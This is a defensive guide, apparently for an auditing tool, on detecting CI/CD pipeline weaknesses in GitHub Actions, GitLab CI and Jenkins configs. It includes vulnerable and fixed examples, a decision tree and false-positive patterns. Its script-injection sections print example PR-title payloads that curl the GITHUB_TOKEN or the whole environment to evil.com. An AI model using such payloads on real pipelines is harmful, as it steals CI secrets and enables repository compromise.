# CI/CD Pipeline Security Detection

## Methodology

### Step 1: Identify CI/CD Configuration Files

Locate all pipeline configurations in the repository:

**GitHub Actions:**
- `.github/workflows/*.yml`, `.github/workflows/*.yaml`
- Reusable workflows referenced via `uses: ./.github/workflows/...`
- Composite actions in `.github/actions/*/action.yml`

**GitLab CI:**
- `.gitlab-ci.yml`
- Included files: `include: local:`, `include: template:`, `include: remote:`
- Child pipeline triggers: `trigger: include:`

**Jenkins:**
- `Jenkinsfile`, `Jenkinsfile.*`
- Shared libraries in `vars/`, `src/`
- `jenkins/*.groovy`, pipeline scripts

**CircleCI:**
- `.circleci/config.yml`
- Orb definitions and references

**Other:**
- `azure-pipelines.yml`, `.travis.yml`, `bitbucket-pipelines.yml`
- `Makefile`, shell scripts called by CI (e.g., `scripts/deploy.sh`)
- Terraform/Pulumi for CI infrastructure

### Step 2: Check for Secrets in CI Configuration

Secrets hardcoded in CI configs are visible to anyone with repository access:

```yaml
# GitHub Actions — VULNERABLE: hardcoded secrets
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    env:
      AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE        # VULNERABLE
      AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG   # VULNERABLE
      DATABASE_URL: postgres://admin:pass@db:5432/app  # VULNERABLE
    steps:
      - run: aws s3 sync ./dist s3://my-bucket
```

```yaml
# GitLab CI — VULNERABLE: secrets in config
variables:
  DEPLOY_TOKEN: "glpat-xxxxxxxxxxxxxxxxxxxx"           # VULNERABLE
  NPM_TOKEN: "npm_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # VULNERABLE

deploy:
  script:
    - echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" > .npmrc
```

```groovy
// Jenkins — VULNERABLE: secrets in pipeline script
pipeline {
    environment {
        DB_PASSWORD = 'Pr0d_P@ssw0rd!'                // VULNERABLE
        API_KEY = 'sk-live-xxxxxxxxxxxxx'              // VULNERABLE
    }
    stages {
        stage('Deploy') {
            steps {
                sh "curl -H 'Authorization: Bearer ${API_KEY}' https://api.example.com/deploy"
            }
        }
    }
}
```

**Safe patterns:**
```yaml
# GitHub Actions — secrets from encrypted store
env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

# GitLab CI — CI/CD variables (masked, protected)
variables:
  DEPLOY_TOKEN: $DEPLOY_TOKEN   # Set in GitLab CI/CD Settings

# Jenkins — credentials binding
withCredentials([string(credentialsId: 'api-key', variable: 'API_KEY')]) {
    sh "curl -H 'Authorization: Bearer ${API_KEY}' https://api.example.com/deploy"
}
```

### Step 3: Check for Untrusted Code Execution (pull_request_target)

The `pull_request_target` trigger in GitHub Actions runs the workflow from the **base branch** but with **write permissions** and **access to secrets**. If the workflow checks out PR code and executes it, an external attacker can run arbitrary code with elevated privileges:

```yaml
# VULNERABLE — checks out and runs untrusted PR code with secrets access
name: PR Review
on: pull_request_target

jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # VULNERABLE — untrusted code
      - run: npm ci && npm test    # Runs attacker's package.json scripts
      - run: make lint             # Runs attacker's Makefile
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}       # Token available to attacker's code
```

**Why dangerous:** `pull_request_target` was designed to let maintainers run trusted workflow code on PRs from forks (which normally cannot access secrets). But if the workflow checks out the PR head (`github.event.pull_request.head.sha`) and executes any code from it (`npm ci`, `make`, `pip install`, running scripts), the attacker's code runs with the base repo's secrets and write permissions.

**Safe pattern:**
```yaml
# Safe — pull_request_target that does NOT checkout or run PR code
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/labeler@v5  # Only reads PR metadata, does not checkout code
```

### Step 4: Check for Script Injection via Untrusted Input

GitHub Actions expressions embedded in `run:` steps can be injected through PR titles, branch names, commit messages, or issue bodies:

```yaml
# VULNERABLE — PR title injected into shell command
- run: echo "Processing PR: ${{ github.event.pull_request.title }}"
# Attacker sets PR title to: "; curl https://evil.com/exfil?token=$GITHUB_TOKEN #
# Resulting command: echo "Processing PR: "; curl https://evil.com/exfil?token=$GITHUB_TOKEN #"

# VULNERABLE — branch name in run step
- run: |
    echo "Branch: ${{ github.head_ref }}"
    git checkout ${{ github.head_ref }}

# VULNERABLE — commit message injection
- run: echo "${{ github.event.head_commit.message }}" | process_commit

# VULNERABLE — issue/comment body injection
- run: |
    COMMENT="${{ github.event.comment.body }}"
    echo "$COMMENT" >> report.txt
```

**Untrusted inputs that can be attacker-controlled:**
- `github.event.pull_request.title` / `.body`
- `github.event.issue.title` / `.body`
- `github.event.comment.body`
- `github.head_ref` (branch name in PRs)
- `github.event.head_commit.message`
- `github.event.discussion.title` / `.body`
- `github.event.pages.*.page_name`

**Safe pattern — use environment variables instead of inline expressions:**
```yaml
- name: Process PR
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Processing PR: $PR_TITLE"
  # Shell variable $PR_TITLE is properly quoted by the shell,
  # preventing injection into the command structure
```

### Step 5: Check CI Service Account Permissions

```yaml
# GitHub Actions — VULNERABLE: excessive permissions
name: Build
on: push
permissions: write-all                     # VULNERABLE — all permissions

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      packages: write
      id-token: write
      actions: write                       # RISKY — can modify workflows
      security-events: write
```

```yaml
# SAFE — minimal permissions
permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: read
    steps:
      - uses: actions/checkout@v4
```

**Check for:**
- Missing top-level `permissions:` key (defaults to `write-all` for some trigger types)
- `permissions: write-all` at workflow or job level
- `GITHUB_TOKEN` with write permissions passed to untrusted actions
- `id-token: write` granted unnecessarily (allows OIDC token minting)

### Step 6: Check Dependency and Artifact Security

```yaml
# VULNERABLE — unpinned action versions (supply chain risk)
steps:
  - uses: actions/checkout@main            # VULNERABLE — mutable branch reference
  - uses: actions/setup-node@v4            # RISKY — tag can be moved to new commit
  - uses: some-org/custom-action@latest    # VULNERABLE — mutable, untrusted

# SAFE — pinned to full commit SHA
steps:
  - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
  - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8  # v4.0.2
```

**Dependency confusion in build steps:**
```yaml
# VULNERABLE — private registry not specified, falls back to public
steps:
  - run: pip install company-internal-package   # Could be hijacked on PyPI
  - run: npm install @company/private-lib       # Scoped, but check .npmrc config
  - run: go get internal.company.com/lib        # Requires GONOSUMCHECK or GOPRIVATE
```

**Missing build provenance:**
```yaml
# No artifact signing, SBOM generation, or provenance attestation
steps:
  - run: docker build -t myapp:${{ github.sha }} .
  - run: docker push myapp:${{ github.sha }}
  # No cosign, SLSA provenance, or Sigstore signing
```

### Step 7: Check Self-Hosted Runner Security

```yaml
# VULNERABLE — self-hosted runner used for public repo PRs
on: pull_request
jobs:
  build:
    runs-on: self-hosted                    # VULNERABLE if public repo
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
```

**Why dangerous:** Self-hosted runners for public repositories allow anyone who submits a PR to execute arbitrary code on the runner machine. Unlike GitHub-hosted runners (which are ephemeral VMs), self-hosted runners are persistent and may contain cached credentials, SSH keys, cloud provider tokens, or access to internal networks. An attacker's PR triggers the workflow, their code runs on the self-hosted runner, and they can install backdoors, steal cached secrets, or pivot to internal infrastructure.

**Check for:**
- `runs-on: self-hosted` in public repositories
- Self-hosted runners without ephemeral/auto-scaling configuration
- Missing runner group restrictions (allowing any workflow to use any runner)
- Runners not isolated in dedicated VMs or containers

### Step 8: Classify

- **VULNERABLE (Critical)**: Hardcoded secrets in CI config, OR `pull_request_target` with untrusted code checkout and secret access, OR script injection with secret exfiltration path
- **VULNERABLE (High)**: Self-hosted runners on public repos, OR `permissions: write-all`, OR unpinned third-party actions from untrusted orgs, OR dependency confusion in build
- **HARDENED (Medium)**: Unpinned actions from trusted orgs (actions/*), OR missing top-level permissions restriction, OR missing build provenance, OR mutable tag references
- **HARDENED (Low)**: Missing SBOM generation, OR no artifact signing for internal-only images, OR GitHub-hosted runners without additional hardening
- **SAFE**: Secrets in encrypted stores, minimal permissions, pinned actions by SHA, no untrusted code execution, signed artifacts
- **BY_DESIGN**: `pull_request_target` that only reads PR metadata without checking out code

## Decision Tree

```
Is a CI/CD configuration file present?
├── No → SAFE (not applicable)
└── Yes → Are secrets hardcoded in the config?
    ├── Yes (literal API keys, passwords, tokens in YAML/Groovy) → VULNERABLE (Critical)
    └── No (uses secret store) → Is pull_request_target used? (GitHub Actions)
        ├── Yes → Does it checkout PR code (head.sha)?
        │   ├── Yes → Does it run that code (npm/pip/make/scripts)?
        │   │   ├── Yes → VULNERABLE (Critical)
        │   │   └── No (only reads files, no execution) → HARDENED (Medium)
        │   └── No (only uses PR metadata) → BY_DESIGN
        └── No → Is there script injection risk?
            ├── Untrusted input in run: steps (PR title, branch name, etc.) → VULNERABLE (High)
            └── No injection → Check permissions:
                ├── write-all or no permissions key → VULNERABLE (High)
                ├── Broader than needed → HARDENED (Medium)
                └── Minimal permissions → Check action pinning:
                    ├── Unpinned third-party actions → VULNERABLE (High)
                    ├── Tag-pinned (v4) without SHA → HARDENED (Medium)
                    └── SHA-pinned → Check runners:
                        ├── Self-hosted on public repo → VULNERABLE (High)
                        ├── Self-hosted, private repo, not ephemeral → HARDENED (Medium)
                        └── GitHub-hosted or ephemeral self-hosted → SAFE
```

## Real-World Examples

### Example 1: pull_request_target with Untrusted Code Execution

**Vulnerable configuration:**
```yaml
# .github/workflows/ci.yml
name: CI
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Setup
        run: npm ci

      - name: Test
        run: npm test

      - name: Comment results
        if: always()
        uses: actions/github-script@v7
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            const fs = require('fs');
            const results = fs.readFileSync('test-results.json', 'utf8');
            github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: `Test results:\n${results}`
            });
```

**Why vulnerable:** The workflow uses `pull_request_target` which grants access to repository secrets and a `GITHUB_TOKEN` with write permissions. It then checks out the PR author's code (`github.event.pull_request.head.sha`) and runs `npm ci` — which executes `preinstall`, `install`, and `postinstall` scripts from the attacker's `package.json`. An external contributor opens a PR that modifies `package.json` to add a `postinstall` script that exfiltrates `$GITHUB_TOKEN` and all available secrets to an external server. Since `pull_request_target` runs the workflow file from the base branch (which is trusted), repository maintainers may not review the PR's `package.json` changes before the workflow executes.

**Impact:** Repository compromise. Attacker obtains a `GITHUB_TOKEN` with write access, can push malicious code to the main branch, modify workflow files to create persistent backdoors, access repository secrets, and potentially compromise downstream consumers.

**Fix:**
```yaml
# Option 1: Use pull_request (no secrets, no write access)
on: pull_request

# Option 2: If you need secrets, do NOT checkout untrusted code
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/labeler@v5    # Only reads PR metadata

  # Run tests in a separate workflow triggered by label
  test:
    if: contains(github.event.pull_request.labels.*.name, 'safe-to-test')
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4   # Checks out BASE branch, not PR
      - run: npm ci && npm test     # Runs trusted code only
```

### Example 2: Script Injection via PR Title in GitHub Actions

**Vulnerable configuration:**
```yaml
# .github/workflows/greeting.yml
name: PR Greeting
on:
  pull_request:
    types: [opened]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Greet PR author
        run: |
          echo "Thank you for PR: ${{ github.event.pull_request.title }}"
          echo "Author: ${{ github.event.pull_request.user.login }}"
          echo "Branch: ${{ github.head_ref }}"

      - name: Add label based on title
        run: |
          TITLE="${{ github.event.pull_request.title }}"
          if echo "$TITLE" | grep -qi "fix"; then
            gh pr edit ${{ github.event.pull_request.number }} --add-label "bugfix"
          fi
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

**Why vulnerable:** The `${{ github.event.pull_request.title }}` expression is interpolated directly into the shell script before execution. An attacker creates a PR with the title:

```
fix"; curl -d @<(env) https://evil.com/steal #
```

The resulting shell command becomes:
```bash
TITLE="fix"; curl -d @<(env) https://evil.com/steal #"
```

This executes `curl` which sends all environment variables (including `GH_TOKEN`) to the attacker's server. The `#` comments out the rest of the line. The `github.head_ref` (branch name) is similarly injectable — the attacker names their branch `"; malicious-command #`.

**Impact:** Secret exfiltration. The `GITHUB_TOKEN` is stolen, allowing the attacker to push code, modify workflows, or access private repositories depending on the token's permissions.

**Fix:**
```yaml
- name: Greet PR author
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    PR_AUTHOR: ${{ github.event.pull_request.user.login }}
    HEAD_REF: ${{ github.head_ref }}
  run: |
    echo "Thank you for PR: $PR_TITLE"
    echo "Author: $PR_AUTHOR"
    echo "Branch: $HEAD_REF"

- name: Add label based on title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    PR_NUMBER: ${{ github.event.pull_request.number }}
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  run: |
    if echo "$PR_TITLE" | grep -qi "fix"; then
      gh pr edit "$PR_NUMBER" --add-label "bugfix"
    fi
```

### Example 3: Secrets in GitLab CI with Exposed Artifacts

**Vulnerable configuration:**
```yaml
# .gitlab-ci.yml
variables:
  DEPLOY_KEY: "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA..."
  REGISTRY_PASSWORD: "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
  SLACK_WEBHOOK: "https://hooks.slack.com/services/T00/B00/xxxx"

stages:
  - build
  - test
  - deploy

build:
  stage: build
  script:
    - echo "$REGISTRY_PASSWORD" | docker login ghcr.io -u deploy --password-stdin
    - docker build -t ghcr.io/org/app:$CI_COMMIT_SHA .
    - docker push ghcr.io/org/app:$CI_COMMIT_SHA
  artifacts:
    paths:
      - build/
    expire_in: 30 days

test:
  stage: test
  script:
    - npm ci
    - npm test 2>&1 | tee test-output.log    # May log env vars on error
  artifacts:
    paths:
      - test-output.log                       # VULNERABLE — may contain secrets from env
    when: always

deploy:
  stage: deploy
  script:
    - echo "$DEPLOY_KEY" > /tmp/deploy_key
    - chmod 600 /tmp/deploy_key
    - scp -i /tmp/deploy_key -r build/ deploy@prod:/app/
    - "curl -X POST $SLACK_WEBHOOK -d '{\"text\": \"Deployed $CI_COMMIT_SHA\"}'"
```

**Why vulnerable:** Three classes of issues. First, the `DEPLOY_KEY`, `REGISTRY_PASSWORD`, and `SLACK_WEBHOOK` are hardcoded in the CI configuration file, which is committed to the repository. Anyone with read access to the repo can see these secrets. Second, the `test-output.log` artifact is saved with `when: always`, and if tests fail with errors that dump environment variables (common in Node.js stack traces), the secrets from the CI environment leak into a downloadable artifact. Third, the deploy key is written to `/tmp/` and used for SCP, but on shared runners, `/tmp/` may be accessible to concurrent jobs or persist between pipeline runs.

**Impact:** Credential exposure through multiple vectors: repository access reveals hardcoded secrets, CI artifacts may leak environment-injected secrets, and shared runner filesystems may expose temporary credential files.

**Fix:**
```yaml
# Secrets stored in GitLab CI/CD Variables (Settings > CI/CD > Variables)
# Marked as "Masked" and "Protected"
# No hardcoded secrets in .gitlab-ci.yml

stages:
  - build
  - test
  - deploy

build:
  stage: build
  script:
    - echo "$REGISTRY_PASSWORD" | docker login ghcr.io -u deploy --password-stdin
    - docker build -t ghcr.io/org/app:$CI_COMMIT_SHA .
    - docker push ghcr.io/org/app:$CI_COMMIT_SHA
  # No artifacts from build stage

test:
  stage: test
  script:
    - npm ci
    - npm test
  artifacts:
    reports:
      junit: test-results.xml     # Structured report, not raw log output
    expire_in: 7 days

deploy:
  stage: deploy
  environment: production
  script:
    # Use GitLab SSH key variable type (file-based, auto-cleaned)
    - chmod 600 "$DEPLOY_SSH_KEY"  # GitLab file variable
    - scp -i "$DEPLOY_SSH_KEY" -r build/ deploy@prod:/app/
  only:
    - main
```

## Common False Positive Patterns

1. **Secrets referenced via CI secret store variables**: `${{ secrets.MY_SECRET }}` (GitHub), `$MY_PROTECTED_VAR` (GitLab with variable set in UI), `credentials('my-cred')` (Jenkins). These are proper secret management — the secret value is not in the config file.

2. **pull_request_target workflows that only read metadata**: Workflows triggered by `pull_request_target` that use actions like `actions/labeler`, `actions/stale`, or `actions/github-script` to read PR metadata and add labels or comments without ever checking out or executing PR code. These are safe by design.

3. **Unpinned actions from the `actions/*` official namespace**: While SHA pinning is best practice, tag-pinned references to official GitHub Actions (`actions/checkout@v4`, `actions/setup-node@v4`) have lower supply chain risk than third-party actions because GitHub controls the namespace. Flag as HARDENED (Low) rather than VULNERABLE.

4. **Self-hosted runners on private repositories with restricted access**: Private repositories where only trusted collaborators can trigger workflows and the runners are properly isolated (ephemeral containers, dedicated VMs, restricted network). The risk model differs significantly from public repositories.

5. **Dummy or example secrets in CI template files**: Values like `YOUR_API_KEY_HERE`, `<replace-me>`, `CHANGEME`, or `xxx` in template or example CI configs that are clearly placeholders and never used in actual pipelines. Check that the real config does not use these values.

6. **GitHub Actions `permissions: write-all` in private repositories with strict branch protection**: While overly broad, the risk is mitigated when the repository is private, has branch protection requiring reviews, and only trusted developers can trigger workflows. Still flag as HARDENED (Medium) but note the mitigating controls.

7. **Environment variables set in `run:` steps from CI-provided variables**: Patterns like `echo "RESULT=$(command)" >> $GITHUB_ENV` or `export VAR=$CI_PIPELINE_ID` where the value comes from CI-provided (non-secret) metadata. These are not secret exposure even though they involve environment variable manipulation.
